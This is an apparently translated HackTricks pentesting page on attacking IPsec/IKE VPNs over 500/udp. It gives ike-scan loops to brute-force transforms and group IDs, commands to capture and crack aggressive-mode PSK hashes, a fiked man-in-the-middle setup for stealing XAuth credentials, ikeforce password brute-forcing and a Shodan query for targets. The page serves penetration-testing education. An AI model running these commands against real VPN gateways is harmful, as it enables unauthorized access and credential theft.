<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>500/udp - Pentesting IPsec/IKE VPN</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="500udp---pentesting-ipsecike-vpn"><a class="header" href="#500udp---pentesting-ipsecike-vpn">500/udp - Pentesting IPsec/IKE VPN</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
{% endhint %}
<h2 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h2>
<p><strong>IPsec</strong> 被广泛认为是保护网络之间（LAN到LAN）和远程用户到网络网关（远程访问）通信的主要技术，是企业VPN解决方案的支柱。</p>
<p><strong>IKE</strong> 管理两个点之间的 <strong>安全关联（SA）</strong> 的建立，它在ISAKMP的框架下运行，ISAKMP是一个用于身份验证和密钥交换的协议。这个过程分为几个阶段：</p>
<ul>
<li><strong>第一阶段：</strong> 在两个端点之间创建一个安全通道。这是通过使用预共享密钥（PSK）或证书来实现的，采用主模式，这涉及三对消息，或 <strong>激进模式</strong>。</li>
<li><strong>第一阶段.5：</strong> 虽然不是强制性的，这一阶段被称为扩展认证阶段，通过要求用户名和密码来验证试图连接的用户的身份。</li>
<li><strong>第二阶段：</strong> 这一阶段专注于协商用于保护数据的 <strong>ESP</strong> 和 <strong>AH</strong> 的参数。它允许使用与第一阶段不同的算法，以确保 <strong>完美前向保密（PFS）</strong>，增强安全性。</li>
</ul>
<p><strong>默认端口：</strong> 500/udp</p>
<h2 id="使用-nmap-发现-服务"><a class="header" href="#使用-nmap-发现-服务"><strong>使用 nmap 发现</strong> 服务</a></h2>
<pre><code>root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
</code></pre>
<h2 id="寻找有效的转换"><a class="header" href="#寻找有效的转换"><strong>寻找有效的转换</strong></a></h2>
<p>IPSec 配置可以仅准备接受一个或几个转换。转换是值的组合。<strong>每个转换</strong>包含多个属性，如 DES 或 3DES 作为 <strong>加密算法</strong>，SHA 或 MD5 作为 <strong>完整性算法</strong>，预共享密钥作为 <strong>认证类型</strong>，Diffie-Hellman 1 或 2 作为密钥 <strong>分发算法</strong>，以及 28800 秒作为 <strong>生命周期</strong>。</p>
<p>然后，您首先要做的就是 <strong>找到一个有效的转换</strong>，这样服务器才能与您通信。为此，您可以使用工具 <strong>ike-scan</strong>。默认情况下，Ike-scan 在主模式下工作，并向网关发送一个带有 ISAKMP 头和一个包含 <strong>八个转换的单个提案</strong>的数据包。</p>
<p>根据响应，您可以获得有关端点的一些信息：</p>
<pre><code>root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
</code></pre>
<p>如您在之前的回复中所见，有一个字段叫做 <strong>AUTH</strong>，其值为 <strong>PSK</strong>。这意味着 VPN 是使用预共享密钥配置的（这对渗透测试人员来说非常好）。<br />
<strong>最后一行的值也非常重要：</strong></p>
<ul>
<li><em>0 返回握手；0 返回通知:</em> 这意味着目标 <strong>不是 IPsec 网关</strong>。</li>
<li><em><strong>1 返回握手；0 返回通知:</strong></em> 这意味着 <strong>目标已配置为 IPsec，并愿意进行 IKE 协商，您提议的一个或多个变换是可接受的</strong>（有效的变换将在输出中显示）。</li>
<li><em>0 返回握手；1 返回通知:</em> VPN 网关在 <strong>没有可接受的变换时</strong> 会以通知消息响应（尽管有些网关不会，在这种情况下应进行进一步分析并尝试修订提案）。</li>
</ul>
<p>然后，在这种情况下，我们已经有了有效的变换，但如果您处于第三种情况，则需要 <strong>稍微暴力破解一下以找到有效的变换：</strong></p>
<p>首先，您需要创建所有可能的变换：</p>
<pre><code class="language-bash">for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" &gt;&gt; ike-dict.txt ;done ;done ;done ;done
</code></pre>
<p>然后使用 ike-scan 对每一个进行暴力破解（这可能需要几分钟）：</p>
<pre><code class="language-bash">while read line; do (echo "Valid trans found: $line" &amp;&amp; sudo ike-scan -M $line &lt;IP&gt;) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done &lt; ike-dict.txt
</code></pre>
<p>如果暴力破解没有成功，可能服务器即使对有效的变换也没有进行握手响应。那么，你可以尝试使用激进模式进行相同的暴力破解：</p>
<pre><code class="language-bash">while read line; do (echo "Valid trans found: $line" &amp;&amp; ike-scan -M --aggressive -P handshake.txt $line &lt;IP&gt;) | grep -B7 "SA=" | grep "Valid trans found" ; done &lt; ike-dict.txt
</code></pre>
<p>希望<strong>有效的转换被回显</strong>。<br />
您可以使用 <a href="https://github.com/isaudits/scripts/blob/master/iker.py"><strong>iker.py</strong></a> 尝试<strong>相同的攻击</strong>。<br />
您还可以尝试使用 <a href="https://github.com/SpiderLabs/ikeforce"><strong>ikeforce</strong></a> 进行暴力破解转换：</p>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; # No parameters are required for scan -h for additional help
</code></pre>
<p><img src="../.gitbook/assets/image%20(617).png" alt="" /></p>
<p>在 <strong>DH 组：14 = 2048 位 MODP</strong> 和 <strong>15 = 3072 位</strong><br />
<strong>2 = HMAC-SHA = SHA1（在这种情况下）。<code>--trans</code> 格式为 $Enc,$Hash,$Auth,$DH</strong></p>
<p>思科表示应避免使用 DH 组 1 和 2，因为它们不够强大。专家认为，<strong>资源丰富的国家可以轻易破解使用这些弱组的数据加密</strong>。这通过使用一种特殊方法来实现，使它们能够快速破解代码。尽管设置这种方法的成本很高，但它允许这些强大的国家实时读取加密数据，如果使用的是不强的组（如 1,024 位或更小）。</p>
<h3 id="服务器指纹识别"><a class="header" href="#服务器指纹识别">服务器指纹识别</a></h3>
<p>然后，您可以使用 ike-scan 尝试 <strong>发现设备的供应商</strong>。该工具发送初始提案并停止重放。然后，它将 <strong>分析</strong> 从服务器接收到的 <strong>消息</strong> 与匹配响应模式之间的 <strong>时间</strong> 差异，渗透测试者可以成功识别 VPN 网关供应商。此外，一些 VPN 服务器将使用可选的 <strong>供应商 ID (VID) 负载</strong> 与 IKE。</p>
<p><strong>如有需要，请指定有效的转换</strong>（使用 --trans）</p>
<p>如果 IKE 发现供应商，它将打印出来：</p>
<pre><code>root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
</code></pre>
<p>这也可以通过 nmap 脚本 <em><strong>ike-version</strong></em> 实现。</p>
<h2 id="查找正确的-id组名"><a class="header" href="#查找正确的-id组名">查找正确的 ID（组名）</a></h2>
<p>为了能够捕获哈希，您需要一个支持 Aggressive 模式的有效转换和正确的 ID（组名）。您可能不知道有效的组名，因此您需要进行暴力破解。<br />
为此，我建议您使用 2 种方法：</p>
<h3 id="使用-ike-scan-进行暴力破解-id"><a class="header" href="#使用-ike-scan-进行暴力破解-id">使用 ike-scan 进行暴力破解 ID</a></h3>
<p>首先尝试使用假 ID 发出请求，试图收集哈希（“-P”）：</p>
<pre><code class="language-bash">ike-scan -P -M -A -n fakeID &lt;IP&gt;
</code></pre>
<p>如果<strong>没有返回哈希</strong>，那么这种暴力破解的方法可能会有效。<strong>如果返回了一些哈希，这意味着将会为一个假ID发送一个假哈希，因此这种方法不可靠</strong>来暴力破解ID。例如，可能会返回一个假哈希（这在现代版本中发生）：</p>
<p><img src="../.gitbook/assets/image%20(917).png" alt="" /></p>
<p>但如果如我所说，没有返回哈希，那么你应该尝试使用ike-scan暴力破解常见的组名。</p>
<p>这个脚本<strong>将尝试暴力破解可能的ID</strong>，并将返回有效握手的ID（这将是一个有效的组名）。</p>
<p>如果你发现了特定的转换，请将其添加到ike-scan命令中。如果你发现了多个转换，可以自由添加一个新的循环来尝试它们所有（你应该尝试它们所有，直到其中一个正常工作）。</p>
<p>你可以使用<a href="https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic">ikeforce的字典</a>或<a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt">seclists中的字典</a>来暴力破解常见的组名：</p>
<pre><code class="language-bash">while read line; do (echo "Found ID: $line" &amp;&amp; sudo ike-scan -M -A -n $line &lt;IP&gt;) | grep -B14 "1 returned handshake" | grep "Found ID:"; done &lt; /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
</code></pre>
<p>Or use this dict (is a combination of the other 2 dicts without repetitions):</p>
<p>{% file src="../.gitbook/assets/vpnIDs.txt" %}</p>
<h3 id="使用-iker-进行-id-暴力破解"><a class="header" href="#使用-iker-进行-id-暴力破解">使用 Iker 进行 ID 暴力破解</a></h3>
<p><a href="https://github.com/isaudits/scripts/blob/master/iker.py"><strong>iker.py</strong></a> 也使用 <strong>ike-scan</strong> 来暴力破解可能的组名。它遵循自己的方法来 <strong>根据 ike-scan 的输出找到有效的 ID</strong>。</p>
<h3 id="使用-ikeforce-进行-id-暴力破解"><a class="header" href="#使用-ikeforce-进行-id-暴力破解">使用 ikeforce 进行 ID 暴力破解</a></h3>
<p><a href="https://github.com/SpiderLabs/ikeforce"><strong>ikeforce.py</strong></a> 是一个可以用来 <strong>暴力破解 ID 的工具</strong>。该工具将 <strong>尝试利用不同的漏洞</strong>，以 <strong>区分有效 ID 和无效 ID</strong>（可能会有误报和漏报，这就是为什么我更喜欢在可能的情况下使用 ike-scan 方法）。</p>
<p>默认情况下，<strong>ikeforce</strong> 将在开始时发送一些随机 ID 以检查服务器的行为并确定使用的策略。</p>
<ul>
<li><strong>第一种方法</strong>是通过 <strong>搜索</strong> Cisco 系统的 <strong>死对等检测 DPD</strong> 信息来暴力破解组名（只有在组名正确时，服务器才会回复此信息）。</li>
<li><strong>第二种方法</strong>是 <strong>检查每次尝试发送的响应数量</strong>，因为有时在使用正确 ID 时会发送更多数据包。</li>
<li><strong>第三种方法</strong>是 <strong>搜索对无效 ID 的响应中的 "INVALID-ID-INFORMATION"</strong>。</li>
<li>最后，如果服务器对检查没有任何回复，<strong>ikeforce</strong> 将尝试暴力破解服务器，并检查在发送正确 ID 时服务器是否回复某些数据包。<br />
显然，暴力破解 ID 的目标是获取 <strong>PSK</strong>，当你拥有有效 ID 时。然后，使用 <strong>ID</strong> 和 <strong>PSK</strong> 你将需要暴力破解 XAUTH（如果启用的话）。</li>
</ul>
<p>如果你发现了特定的转换，请将其添加到 ikeforce 命令中。如果你发现了多个转换，请随意添加一个新循环以尝试它们所有（你应该尝试它们所有，直到其中一个正常工作）。</p>
<pre><code class="language-bash">git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
</code></pre>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; -e -w ./wordlists/groupnames.dic
</code></pre>
<h3 id="sniffing-id"><a class="header" href="#sniffing-id">Sniffing ID</a></h3>
<p>(来自书籍 <strong>Network Security Assessment: Know Your Network</strong>): 通过嗅探VPN客户端和服务器之间的连接，也可以获得有效的用户名，因为第一个包含客户端ID的攻击模式数据包是以明文发送的。</p>
<p><img src="../.gitbook/assets/image%20(891).png" alt="" /></p>
<h2 id="capturing--cracking-the-hash"><a class="header" href="#capturing--cracking-the-hash">Capturing &amp; cracking the hash</a></h2>
<p>最后，如果您找到了 <strong>有效的转换</strong> 和 <strong>组名</strong>，并且 <strong>允许攻击模式</strong>，那么您可以非常轻松地获取可破解的哈希：</p>
<pre><code class="language-bash">ike-scan -M -A -n &lt;ID&gt; --pskcrack=hash.txt &lt;IP&gt; #If aggressive mode is supported and you know the id, you can get the hash of the passwor
</code></pre>
<p>哈希将保存在 <em>hash.txt</em> 中。</p>
<p>您可以使用 <strong>psk-crack</strong>、<strong>john</strong>（使用 <a href="https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py"><strong>ikescan2john.py</strong></a>）和 <strong>hashcat</strong> 来 <strong>crack</strong> 哈希：</p>
<pre><code class="language-bash">psk-crack -d &lt;Wordlist_path&gt; psk.txt
</code></pre>
<h2 id="xauth"><a class="header" href="#xauth"><strong>XAuth</strong></a></h2>
<p><strong>Aggressive mode IKE</strong> 结合 <strong>预共享密钥 (PSK)</strong> 通常用于 <strong>组认证</strong> 目的。此方法通过 <strong>XAuth (扩展认证)</strong> 得到增强，后者用于引入额外的 <strong>用户认证</strong> 层。此类认证通常利用 <strong>Microsoft Active Directory</strong>、<strong>RADIUS</strong> 或类似系统。</p>
<p>转向 <strong>IKEv2</strong> 时，观察到一个显著的变化，即 <strong>EAP (可扩展认证协议)</strong> 被用来替代 <strong>XAuth</strong> 进行用户认证。这一变化强调了安全通信协议中认证实践的演变。</p>
<h3 id="本地网络-mitm-捕获凭证"><a class="header" href="#本地网络-mitm-捕获凭证">本地网络 MitM 捕获凭证</a></h3>
<p>因此，您可以使用 <em>fiked</em> 捕获登录数据，并查看是否有任何默认用户名（您需要将 IKE 流量重定向到 <code>fiked</code> 进行嗅探，这可以通过 ARP 欺骗来完成，<a href="https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/">更多信息</a>）。Fiked 将充当 VPN 端点并捕获 XAuth 凭证：</p>
<pre><code class="language-bash">fiked -g &lt;IP&gt; -k testgroup:secretkey -l output.txt -d
</code></pre>
<p>也可以使用IPSec尝试进行中间人攻击并阻止所有流量到端口500，如果无法建立IPSec隧道，流量可能会以明文发送。</p>
<h3 id="使用ikeforce暴力破解xauth用户名和密码"><a class="header" href="#使用ikeforce暴力破解xauth用户名和密码">使用ikeforce暴力破解XAUTH用户名和密码</a></h3>
<p>要暴力破解<strong>XAUTH</strong>（当你知道有效的组名<strong>id</strong>和<strong>psk</strong>时），你可以使用一个用户名或用户名列表以及一个密码列表：</p>
<pre><code class="language-bash">./ikeforce.py &lt;IP&gt; -b -i &lt;group_id&gt; -u &lt;username&gt; -k &lt;PSK&gt; -w &lt;passwords.txt&gt; [-s 1]
</code></pre>
<p>这样，ikeforce将尝试使用每个用户名:密码的组合进行连接。</p>
<p>如果您找到一个或多个有效的变换，只需像之前的步骤一样使用它们。</p>
<h2 id="使用ipsec-vpn进行身份验证"><a class="header" href="#使用ipsec-vpn进行身份验证">使用IPSEC VPN进行身份验证</a></h2>
<p>在Kali中，<strong>VPNC</strong>用于建立IPsec隧道。<strong>配置文件</strong>必须位于目录<code>/etc/vpnc/</code>中。您可以使用命令_<strong>vpnc</strong>_来启动这些配置文件。</p>
<p>以下命令和配置说明了使用VPNC设置VPN连接的过程：</p>
<pre><code class="language-bash">root@system:~# cat &gt; /etc/vpnc/samplevpn.conf &lt;&lt; STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
</code></pre>
<p>在此设置中：</p>
<ul>
<li>将 <code>[VPN_GATEWAY_IP]</code> 替换为 VPN 网关的实际 IP 地址。</li>
<li>将 <code>[VPN_CONNECTION_ID]</code> 替换为 VPN 连接的标识符。</li>
<li>将 <code>[VPN_GROUP_SECRET]</code> 替换为 VPN 的组密钥。</li>
<li>将 <code>[VPN_USERNAME]</code> 和 <code>[VPN_PASSWORD]</code> 替换为 VPN 身份验证凭据。</li>
<li><code>[PID]</code> 表示在 <code>vpnc</code> 启动时将分配的进程 ID。</li>
</ul>
<p>确保在配置 VPN 时使用实际的、安全的值来替换占位符。</p>
<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
<ul>
<li><a href="http://www.ernw.de/download/pskattack.pdf">PSK 破解论文</a></li>
<li><a href="http://www.securityfocus.com/infocus/1821">SecurityFocus 深度分析</a></li>
<li><a href="http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf">扫描 VPN 实现</a></li>
<li>网络安全评估 第3版</li>
</ul>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:500 IKE</code></li>
</ul>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-ldap.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/pentesting-modbus.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-ldap.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/pentesting-modbus.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
